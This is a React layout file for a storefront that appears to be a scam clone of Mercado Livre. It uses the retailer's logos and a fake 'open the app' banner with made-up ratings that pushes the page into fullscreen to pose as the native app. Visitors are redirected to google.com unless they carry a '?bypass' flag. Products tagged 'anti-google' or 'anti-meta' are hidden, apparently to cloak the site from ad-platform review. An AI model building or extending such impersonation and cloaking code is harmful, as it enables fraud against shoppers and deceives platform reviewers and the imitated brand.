const StoreLoader = () => (
  <div
    style={{
      position: 'fixed',
      inset: 0,
      zIndex: 99999,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      backgroundColor: '#fff159',
    }}
  >
    <div
      style={{
        width: 48,
        height: 48,
        border: '4px solid transparent',
        borderTop: '4px solid #3483fa',
        borderRadius: '50%',
        animation: 'store-loader-spin 0.8s linear infinite',
      }}
    />
    <style>{`
      @keyframes store-loader-spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `}</style>
  </div>
);

const SpaTransitionOverlay = ({ settings, setIsSpaActive, isSpaActive, isTransitioning, setIsTransitioning }: { 
  settings: any, 
  setIsSpaActive: (val: boolean) => void, 
  isSpaActive: boolean,
  isTransitioning: boolean,
  setIsTransitioning: (val: boolean) => void
}) => {
  const [showPopup, setShowPopup] = useState(false);
  const [step, setStep] = useState<"loading" | "logo" | "done">("loading");

  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  useEffect(() => {
    if (!settings?.spa_enabled) return;

    if (!isMobile) return;

    setShowPopup(true);
  }, [settings]);

  const handleStartApp = async () => {
    setShowPopup(false);
    setIsTransitioning(true);
    
    // Immediate CSS/State injection as requested by user
    setIsSpaActive(true);
    document.body.classList.add('spa-active');

    try {
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      }
    } catch (err) {
      console.error("Fullscreen error:", err);
    }

    // Sequence
    setStep("loading");
    
    setTimeout(() => {
      setStep("logo");
      setTimeout(() => {
        setStep("done");
        // Minor delay to ensure smooth exit
        setTimeout(() => {
          setIsTransitioning(false);
        }, 500);
      }, 1500);
    }, 1500);
  };

  if (!isTransitioning && (!showPopup || isSpaActive)) return null;

  return (
    <>
      {/* Floating Popup (Bottom Banner) */}
      {showPopup && (
        <>
          <div className="download-app-bottom-banner-opacity" onClick={() => setShowPopup(false)}></div>
          <div className="download-app-bottom-banner-wrapper">
            <div className="download-app-bottom-banner-row">
              <img 
                src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/modal-logo-120x120.jpg" 
                alt="App Logo" 
                width="73" 
                height="73" 
                className="download-app-bottom-banner-icon"
              />
              <div className="download-app-bottom-banner-header">
                <div className="download-app-bottom-banner-rating-container">
                  <span className="clipped"> Qualificação [4.8] de 5</span>
                  <div className="download-app-bottom-banner-rating-row" aria-hidden="true">
                    <span className="download-app-bottom-banner-rating">4.8</span>
                    <i className="download-app-bottom-banner-rating-icon"></i>
                  </div>
                </div>
                <span className="download-app-bottom-banner-comments">+300 k opiniões</span>
              </div>
            </div>
            <span className="download-app-bottom-banner-title">Deseja abrir o aplicativo do mercado livre?</span>
            <button 
              id="download-app-bottom-banner-download" 
              className="download-app-bottom-banner-button"
              onClick={handleStartApp}
            >
              Abrir app do Mercado Livre
            </button>
            <button 
              id="download-app-bottom-banner-close" 
              className="download-app-bottom-banner-link"
              onClick={() => setShowPopup(false)}
            >
              Agora não
            </button>
          </div>
        </>
      )}

      {/* Transition View */}
      {isTransitioning && step !== "done" && (
        <div 
          className="fixed inset-0 z-[100000] flex flex-col items-center justify-center bg-[#ffe600] animate-in fade-in duration-300"
          style={{ height: '100vh', width: '100vw' }}
        >
          {step === "loading" && (
            <div className="flex flex-col items-center gap-6">
              <div className="w-16 h-16 border-4 border-[#ffe600] border-t-[#3483fa] rounded-full animate-spin" />
            </div>
          )}
          
          {step === "logo" && (
            <img 
              src="/app_ml.png" 
              alt="App Logo" 
              className="w-32 h-32 object-contain animate-in zoom-in-75 fade-in duration-500" 
            />
          )}
        </div>
      )}
    </>
  );
};

const routeKeyMap: Record<string, string> = {
  "/store": "home",
  "/store/search": "search",
  "/store/cart": "cart",
  "/store/products": "products",
  "/store/checkout": "checkout",
};

const isAntiStatus = (status: string | null | undefined) => {
  const normalized = status?.toLowerCase() ?? "";
  return (
    normalized === "anti-google v1" ||
    normalized === "anti-google-v1" ||
    normalized === "anti-meta v1" ||
    normalized === "anti-meta-v1" ||
    normalized === "anti-meta-ads-v1"
  );
};

const isHiddenStatus = (status: string | null | undefined) => {
  const normalized = status?.toLowerCase() ?? "";
  return normalized === "inactive" || normalized === "inativo";
};

const StoreLayout = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const productSlugMatch = location.pathname.match(/^\/store\/product\/([^/]+)/);
  const productSlug = productSlugMatch ? decodeURIComponent(productSlugMatch[1]) : null;
  const collectionSlugMatch = location.pathname.match(/^\/store\/collection\/([^/]+)/);
  const collectionSlug = collectionSlugMatch ? decodeURIComponent(collectionSlugMatch[1]) : null;

  // Tracking & Mascara
  const { storeSettings } = useStore();
  useTracking();
  const { mascara } = useMascara();

  const [loading, setLoading] = useState(true);
  const [isSpaActive, setIsSpaActive] = useState(false);
  const [isSpaTransitioning, setIsSpaTransitioning] = useState(false);
  const [authorized, setAuthorized] = useState(false);
  const [routeBlocked, setRouteBlocked] = useState(false);
  const [productGateState, setProductGateState] = useState<{ slug: string | null; mode: "loading" | "anti" | "normal" | "hidden" }>({
    slug: null,
    mode: "normal",
  });
  const [collectionGateMode, setCollectionGateMode] = useState<"loading" | "normal" | "anti" | "hidden">("normal");

  useEffect(() => {
    // Bypass access control - check BEFORE rendering anything
    const params = new URLSearchParams(window.location.search);
    if (params.has('bypass')) {
      localStorage.setItem('store_access', 'authorized');
    }
    const hasAccess = localStorage.getItem('store_access') === 'authorized';
    if (!hasAccess) {
      window.location.href = 'https://www.google.com';
      return;
    }
    setAuthorized(true);
  }, []);

  // Check if current route is disabled
  useEffect(() => {
    if (!authorized) return;
    const checkRouteStatus = async () => {
      const routeKey = routeKeyMap[location.pathname];
      if (!routeKey) {
        setRouteBlocked(false);
        return;
      }
      const { data } = await supabase
        .from("settings")
        .select("value")
        .eq("key", "route_statuses")
        .maybeSingle();
      if (data?.value && typeof data.value === "object") {
        const statuses = data.value as Record<string, boolean>;
        setRouteBlocked(statuses[routeKey] === false);
      } else {
        setRouteBlocked(false);
      }
    };
    checkRouteStatus();
  }, [authorized, location.pathname]);

  // Prevent rendering any store layout content for anti products until CONTINUAR
  useEffect(() => {
    if (!authorized) return;

    if (!productSlug) {
      setProductGateState({ slug: null, mode: "normal" });
      return;
    }

    let cancelled = false;
    setProductGateState({ slug: productSlug, mode: "loading" });

    const checkProductStatus = async () => {
      const { data } = await supabase
        .from("products")
        .select("status")
        .eq("slug", productSlug)
        .maybeSingle();

      if (cancelled) return;

      if (!data) {
        // Product not found — hide everything
        setProductGateState({ slug: productSlug, mode: "hidden" });
      } else if (isHiddenStatus(data.status)) {
        // Inactive — hide everything
        setProductGateState({ slug: productSlug, mode: "hidden" });
      } else if (isAntiStatus(data.status)) {
        setProductGateState({ slug: productSlug, mode: "anti" });
      } else {
        setProductGateState({ slug: productSlug, mode: "normal" });
      }
    };

    checkProductStatus();

    return () => {
      cancelled = true;
    };
  }, [authorized, productSlug]);

  // Unlock layout after CONTINUAR click on anti products
  useEffect(() => {
    const handleUnlock = (event: Event) => {
      const customEvent = event as CustomEvent<{ slug?: string }>;
      if (productSlug && customEvent.detail?.slug === productSlug) {
        setProductGateState({ slug: productSlug, mode: "normal" });
      }
    };

    window.addEventListener("anti-product-unlocked", handleUnlock as EventListener);
    return () => window.removeEventListener("anti-product-unlocked", handleUnlock as EventListener);
  }, [productSlug]);

  // Collection gate — hide layout for inactive/not-found collections
  useEffect(() => {
    if (!authorized || !collectionSlug) {
      setCollectionGateMode("normal");
      return;
    }
    setCollectionGateMode("loading");
    let cancelled = false;
    const check = async () => {
      const { data } = await supabase
        .from("collections")
        .select("status")
        .eq("slug", collectionSlug)
        .maybeSingle();
      if (cancelled) return;
      if (!data) {
        setCollectionGateMode("hidden");
      } else if (isHiddenStatus(data.status)) {
        setCollectionGateMode("hidden");
      } else if (isAntiStatus(data.status)) {
        setCollectionGateMode("anti");
      } else {
        setCollectionGateMode("normal");
      }
    };
    check();
    return () => { cancelled = true; };
  }, [authorized, collectionSlug]);

  useEffect(() => {
    // If SPA is active, don't show the initial yellow loader on every navigation
    if (isSpaActive) {
      setLoading(false);
      document.body.style.backgroundColor = '';
      return;
    }

    setLoading(true);
    document.body.style.backgroundColor = '#fff159';

    const isHomePage = location.pathname === '/store' || location.pathname === '/store/';
    let pageLoaded = false;
    let dataReady = !isHomePage; // non-home pages don't need to wait for data
    let hidden = false;

    const tryHide = () => {
      if (hidden || !pageLoaded || !dataReady) return;
      hidden = true;
      setTimeout(() => {
        setLoading(false);
        document.body.style.backgroundColor = '';
      }, 500);
    };

    const onPageLoad = () => {
      pageLoaded = true;
      tryHide();
    };

    const onDataReady = () => {
      dataReady = true;
      tryHide();
    };

    if (document.readyState === 'complete') {
      pageLoaded = true;
    } else {
      window.addEventListener('load', onPageLoad);
    }

    window.addEventListener('store-home-data-ready', onDataReady);

    // If both are already true (e.g. page cached + not home), hide now
    tryHide();

    const fallback = setTimeout(() => {
      if (!hidden) {
        hidden = true;
        setLoading(false);
        document.body.style.backgroundColor = '';
      }
    }, 3000);

    return () => {
      window.removeEventListener('load', onPageLoad);
      window.removeEventListener('store-home-data-ready', onDataReady);
      clearTimeout(fallback);
      document.body.style.backgroundColor = '';
    };
  }, [authorized, location.pathname]);

  // Global Link Interceptor for SPA experience
  useEffect(() => {
    const handleGlobalClick = (e: MouseEvent) => {
      // Find the closest anchor tag
      const anchor = (e.target as HTMLElement).closest('a');
      
      if (anchor && anchor instanceof HTMLAnchorElement) {
        const href = anchor.getAttribute('href');
        
        // Skip if no href or it's an external link/anchor
        if (!href || href.startsWith('http') || href.startsWith('//') || href.startsWith('#') || href.startsWith('tel:') || href.startsWith('mailto:')) {
          return;
        }

        // Only intercept internal /store links
        if (href.startsWith('/store')) {
          // Allow default behavior for modifier keys (open in new tab)
          if (e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) {
            return;
          }

          e.preventDefault();
          window.scrollTo(0, 0);
          navigate(href);
        }
      }
    };

    window.addEventListener('click', handleGlobalClick);
    
    // Global Form Submit Interceptor
    const handleGlobalSubmit = (e: SubmitEvent) => {
      const form = e.target as HTMLFormElement;
      const searchInput = form.querySelector('input[name="as_word"]') as HTMLInputElement;
      
      if (searchInput) {
        const q = searchInput.value.trim();
        if (q) {
          e.preventDefault();
          window.scrollTo(0, 0);
          navigate(`/store/search?q=${encodeURIComponent(q)}`);
        }
      }
    };

    // Custom Navigation Event Listener
    const handleSpaNavigate = (e: Event) => {
      const customEvent = e as CustomEvent<{ url: string }>;
      const url = customEvent.detail?.url;
      if (url) {
        window.scrollTo(0, 0);
        navigate(url);
      }
    };

    window.addEventListener('submit', handleGlobalSubmit);
    window.addEventListener('spa-navigate', handleSpaNavigate as EventListener);

    // Expose a global spaNavigate function for manual redirects
    (window as any).spaNavigate = (url: string) => {
      window.scrollTo(0, 0);
      navigate(url);
    };

    // Fullscreen Change Listener
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement) {
        // User exited fullscreen (maybe via ESC)
        setIsSpaActive(false);
        document.body.classList.remove('spa-active');
        document.body.style.backgroundColor = '';
      }
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);

    return () => {
      window.removeEventListener('click', handleGlobalClick);
      window.removeEventListener('submit', handleGlobalSubmit);
      window.removeEventListener('spa-navigate', handleSpaNavigate as EventListener);
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      delete (window as any).spaNavigate;
    };
  }, [navigate]);

  const shouldHideStoreChromeForProduct = Boolean(productSlug) && (productGateState.slug !== productSlug || productGateState.mode !== "normal");
  const shouldHideStoreChromeForCollection = Boolean(collectionSlug) && collectionGateMode !== "normal";
  const isCollectionPage = location.pathname.startsWith('/store/collection/');
  const isCheckoutPage = location.pathname.startsWith('/store/checkout') && location.pathname !== '/store/checkout/drop';

  // Apply mascara CSS variables + logo swap + footer data
  useEffect(() => {
    if (mascara.active && mascara.primary_color) {
      document.documentElement.style.setProperty('--mascara-primary', mascara.primary_color);
      document.documentElement.style.setProperty('--mascara-secondary', mascara.secondary_color || '#3483fa');
    }
    if (mascara.active && mascara.text_color) {
      document.documentElement.style.setProperty('--mascara-text', mascara.text_color);
    }
    return () => {
      document.documentElement.style.removeProperty('--mascara-primary');
      document.documentElement.style.removeProperty('--mascara-secondary');
      document.documentElement.style.removeProperty('--mascara-text');
    };
  }, [mascara]);

  // Apply mascara logo + branding via CSS injection
  useEffect(() => {
    const styleId = 'mascara-logo-style';
    const existing = document.getElementById(styleId);
    if (existing) existing.remove();

    // Determine country from localStorage (set by I18nContext)
    const countryCode = localStorage.getItem('app_country') || 'BR';
    const isBrazil = countryCode === 'BR';

    let desktopLogo: string;
    let mobileLogo: string;

    if (mascara.active && mascara.logo_url) {
      // Mascara active: use custom logo for both
      desktopLogo = mascara.logo_url;
      mobileLogo = mascara.logo_url;
    } else if (isBrazil) {
      desktopLogo = "https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/pt_logo_large_plus@2x.webp";
      mobileLogo = "https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/logo__small@2x.png";
    } else {
      desktopLogo = "https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/logo_large_plus@2x.webp";
      mobileLogo = "https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/logo__small@2x.png";
    }

    const style = document.createElement('style');
    style.id = styleId;
    style.textContent = `
      @media (min-width: 768px) {
        a.nav-logo {
          background-image: url('${desktopLogo}') !important;
          background-size: contain !important;
          background-repeat: no-repeat !important;
        }
      }
      @media (max-width: 767px) {
        a.nav-logo {
          background-image: url('${mobileLogo}') !important;
          background-size: contain !important;
          background-repeat: no-repeat !important;
        }
        .nav-footer .nav-footer-downloadapp-banner .nav-icon.nav-icon-downloadapp {
          background-image: url('${mobileLogo}') !important;
          background-size: 50px !important;
        }
        p.nav-footer-user {
          display: none !important;
        }
      }
      ${mascara.active && mascara.primary_color ? `
        .nav-header, .nav-header-menu, .nav-header-menu-wrapper,
        .nav-footer, .nav-footer-user-info,
        .nav-footer-access, .nav-footer-access-content {
          background-color: ${mascara.primary_color} !important;
        }
      ` : ''}
      ${mascara.active && mascara.text_color ? `
        .nav-header, .nav-header a, .nav-header span, .nav-header button,
        .nav-header-menu, .nav-header-menu a, .nav-header-menu span,
        .nav-footer, .nav-footer a, .nav-footer span, .nav-footer small,
        .nav-footer-access, .nav-footer-access a, .nav-footer-access span,
        .nav-footer-access h3, .nav-footer-access h2, .nav-footer-access button,
        .nav-footer-copyright, .nav-footer-secondaryinfo, .nav-footer-hp,
        .nav-footer-navigation__link,
        .nav-header-user-myml, .nav-header-user-myml span {
          color: ${mascara.text_color} !important;
        }
      ` : ''}
    `;
    document.head.appendChild(style);

    return () => {
      const el = document.getElementById(styleId);
      if (el) el.remove();
    };
  }, [mascara]);

  // No longer needed — mascara data is now sanitized at the HTML string level before rendering

  if (!authorized) return null;
  if (routeBlocked) return <div style={{ minHeight: '100vh', background: '#fff' }} />;
  if (productGateState.mode === "hidden" || collectionGateMode === "hidden") return null;

  if (shouldHideStoreChromeForProduct || shouldHideStoreChromeForCollection || isCheckoutPage) {
    return (
      <div className="font-store" style={{ display: 'contents' }}>
        {loading && <StoreLoader />}
        {isCheckoutPage && <div id="_R_v6e_" style={{ display: 'contents' }} dangerouslySetInnerHTML={{ __html: svgSprites }} />}
        <Outlet />
      </div>
    );
  }

  return (
    <div className="font-store" style={{ display: 'contents' }}>
      {loading && <StoreLoader />}
      <SpaTransitionOverlay 
        settings={storeSettings} 
        setIsSpaActive={setIsSpaActive}
        isSpaActive={isSpaActive}
        isTransitioning={isSpaTransitioning}
        setIsTransitioning={setIsSpaTransitioning}
      />
      <div id="_R_v6e_" style={{ display: 'contents' }} dangerouslySetInnerHTML={{ __html: svgSprites }} />
      <StoreMobileHeader mascara={mascara} isSpaActive={isSpaActive} />
      <StoreDesktopHeader mascara={mascara} />
      {isCollectionPage ? (
        <Outlet />
      ) : (
        <main role="main" id="root-app" data-navigation="true">
          <Outlet />
        </main>
      )}
      <StoreDesktopFooter mascara={mascara} />
      <StoreMobileNav isSpaActive={isSpaActive && !isSpaTransitioning} />
      <StoreMobileFooter mascara={mascara} />
    </div>
  );
};

export default StoreLayout;
